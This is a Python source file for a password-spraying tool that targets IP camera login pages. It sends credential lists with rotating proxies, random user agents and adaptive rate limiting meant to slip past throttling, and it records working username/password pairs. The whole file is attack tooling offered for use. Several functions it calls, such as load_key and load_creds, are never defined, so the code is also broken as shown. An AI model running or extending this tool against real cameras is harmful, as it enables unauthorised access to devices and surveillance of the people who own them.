import aiohttp
import asyncio
import random
from itertools import cycle
from colorama import Fore
from tqdm import tqdm
from src.constants import USER_AGENTS, MAX_RETRIES, TIMEOUT, ERROR_PATTERNS
from src.utils import adaptive_rate_limit, is_camera_reachable
from src.throttler import train_anomaly_detector, should_throttle
from src.parser import extract_with_xpath, extract_with_jsonpath
from src.proxy_manager import CONNECTIONS, refresh_proxies_from_url
from src.encryption import decrypt_data
from src.proxy_analytics import log_proxy_usage

# Rotate through proxies if available
rotating_proxies = cycle(CONNECTIONS)
success_attempts = []
failed_attempts = []
errors = []
response_times = []
status_codes = []

# Train a basic anomaly detection model (using dummy data initially)
# You could use actual data from previous responses for more accuracy.
model = train_anomaly_detector([0.5, 1.0, 2.5], [200, 429, 500])

async def perform_request(session, target_url, login_data, proxy_config=None):
    """
    Perform an HTTP POST request to the target URL with specified login data and proxy configuration.
    Uses adaptive rate limiting and handles retries with error pattern checks.
    """
    user, encrypted_pwd = login_data
    key = load_key()  # Load the encryption key to decrypt password
    pwd = decrypt_data(encrypted_pwd, key)  # Decrypt the password before use
    request_headers = {"User-Agent": random.choice(USER_AGENTS)}
    login_payload = {'username': user, 'password': pwd}
    retries = 0

    while retries < MAX_RETRIES:
        try:
            timeout = aiohttp.ClientTimeout(total=TIMEOUT)
            if proxy_config:
                proxy_url = f"{proxy_config['type']}://{proxy_config['address']}"
                print(f"{Fore.CYAN}[INFO] Using proxy: {proxy_url}")
                async with session.post(target_url, headers=request_headers, data=login_payload, proxy=proxy_url, timeout=timeout) as resp:
                    await handle_response(resp, user, pwd, proxy_config)
                    log_response(resp, user)
                    return resp.status == 200
            else:
                async with session.post(target_url, headers=request_headers, data=login_payload, timeout=timeout) as resp:
                    await handle_response(resp, user, pwd, proxy_config)
                    log_response(resp, user)
                    return resp.status == 200

        except asyncio.TimeoutError:
            print(f"{Fore.RED}[TIMEOUT] User: {user}, Retry: {retries + 1}")
            errors.append((user, pwd, "Timeout"))
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Request failed for {user}: {e}")
            errors.append((user, pwd, str(e)))
            break

        retries += 1
        await asyncio.sleep(1)  # Wait before retrying to prevent flooding

    return False

async def handle_response(response, user, pwd, proxy_config):
    """
    Handle the HTTP response from a login attempt. Checks for success or known failure patterns.
    """
    response_time = response.elapsed.total_seconds()
    status = response.status
    status_codes.append(status)
    response_times.append(response_time)

    # Extract tokens or information if necessary using custom parser rules (e.g., XPath/JSONPath)
    if response.content_type == 'application/json':
        json_response = await response.json()
        tokens = extract_with_jsonpath(json_response, "$.auth_token")  # Example usage
    elif response.content_type == 'text/xml':
        xml_response = await response.text()
        tokens = extract_with_xpath(xml_response, "//auth/token")

    if status == 200:
        response_text = await response.text()
        for pattern in ERROR_PATTERNS:
            if pattern.lower() in response_text.lower():
                print(f"{Fore.RED}[FAILED] User: {user}, Pass: {pwd} - Pattern: {pattern}")
                failed_attempts.append((user, pwd))
                log_proxy_usage(proxy_config['address'], success=False)
                return False

        print(f"{Fore.GREEN}[SUCCESS] User: {user}, Pass: {pwd}")
        success_attempts.append((user, pwd))
        log_proxy_usage(proxy_config['address'], success=True)
        return True
    else:
        print(f"{Fore.YELLOW}[ERROR] HTTP {status} for {user}:{pwd}")
        errors.append((user, pwd, f"HTTP {status}"))
        log_proxy_usage(proxy_config['address'], success=False)
        return False

def log_response(response, user):
    """
    Logs the status code and latency of each response for analysis.
    """
    status_code = response.status
    response_time = response.elapsed.total_seconds()
    print(f"{Fore.CYAN}[INFO] User: {user}, Status Code: {status_code}, Response Time: {response_time} seconds")

async def try_http_https(session, user, pwd, login_payload, target_url, proxy_config=None):
    """
    Attempts login using both HTTP and HTTPS in case one fails.
    """
    try_urls = [target_url, target_url.replace("https://", "http://")] if target_url.startswith("https://") else [target_url, target_url.replace("http://", "https://")]
    for url in try_urls:
        try:
            print(f"{Fore.CYAN}[INFO] Trying URL: {url}")
            result = await perform_request(session, url, (user, pwd), proxy_config=proxy_config)
            if result:
                return True  # If the request is successful on any URL
        except Exception as e:
            print(f"{Fore.YELLOW}[WARN] Failed with {url}: {e}")
    return False

async def pspray(t_url, creds_f, use_proxies, model_name):
    """
    Perform password spraying by attempting login using a list of credentials, proxies, and model-specific settings.
    """
    creds = load_creds(creds_f)
    login_url, user_field, pwd_field = get_model_specific_data(model_name)
    async with aiohttp.ClientSession() as sess:
        with tqdm(total=len(creds), desc="Attempting logins", unit="login") as pbar:
            tasks = []
            for user, pwd in creds:
                if not is_camera_reachable(t_url):
                    print(f"{Fore.YELLOW}[INFO] Camera not reachable. Skipping.")
                    continue

                # Fetch a proxy configuration if proxies are being used
                proxy_config = next(rotating_proxies) if use_proxies and CONNECTIONS else None
                task = asyncio.ensure_future(
                    try_http_https(sess, user, pwd, {'username': user, 'password': pwd}, f"{t_url}{login_url}", proxy_config)
                )
                tasks.append(task)

                await adaptive_rate_limit(response_times[-1] if response_times else 1, status_codes[-1] if status_codes else 200, model)
                pbar.update(1)

            await asyncio.gather(*tasks)

    analyze_proxy_performance()  # Analyze and potentially refresh proxies based on performance